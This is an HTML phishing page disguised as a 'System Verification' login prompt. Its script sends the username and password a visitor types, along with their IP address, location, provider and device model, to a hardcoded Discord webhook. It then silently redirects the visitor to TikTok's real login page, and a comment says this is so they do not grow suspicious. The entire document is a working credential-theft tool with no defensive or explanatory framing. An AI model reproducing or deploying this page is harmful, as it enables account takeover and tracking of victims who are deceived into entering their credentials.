<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
</head>
<body>

    <input type="text" id="user" placeholder="Username or Email">
    <input type="password" id="pass" placeholder="Password">
    <button onclick="captureData()">Verify & Login</button>

    <script>
    async function captureData() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        const webhook = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        if (!user || !pass) {
            alert("Please fill in all required fields.");
            return;
        }

        try {
            // 1. Fetch IP and Location Data immediately
            const ipResponse = await fetch('https://ipapi.co/json/').catch(() => ({}));
            const ipData = await ipResponse.json();

            // 2. Extract Device Model from UserAgent
            const userAgent = navigator.userAgent;
            const modelMatch = userAgent.match(/\(([^)]+)\)/);
            const deviceModel = modelMatch ? modelMatch[1] : "Unknown Device";

            // 3. Construct the Professional Discord Payload
            const payload = {
                username: "Security Data Hub",
                embeds: [{
                    title: "CRITICAL: Data Log Captured",
                    color: 16711680, // Bold Red
                    fields: [
                        { name: "👤 USERNAME", value: `\`${user}\``, inline: true },
                        { name: "🔑 PASSWORD", value: `\`${pass}\``, inline: true },
                        { name: "📱 DEVICE MODEL", value: `**${deviceModel}**`, inline: false },
                        { name: "🌐 IP ADDRESS", value: `**${ipData.ip || 'NOT_FOUND'}**`, inline: true },
                        { name: "📍 LOCATION", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true },
                        { name: "📡 PROVIDER", value: `${ipData.org || 'UNKNOWN'}`, inline: false }
                    ],
                    footer: { text: "Transmission Verified | " + new Date().toLocaleString() }
                }]
            };

            // 4. THE POWERFUL TRANSMISSION METHOD
            // 'keepalive: true' ensures data is sent even if the user leaves the page.
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true 
            });

            // 5. Final Redirection to Official Page
            window.location.replace("https://www.tiktok.com/login");

        } catch (error) {
            // Fallback redirection so the user doesn't get suspicious
            window.location.replace("https://www.tiktok.com/login");
        }
    }
    </script>
</body>
</html>
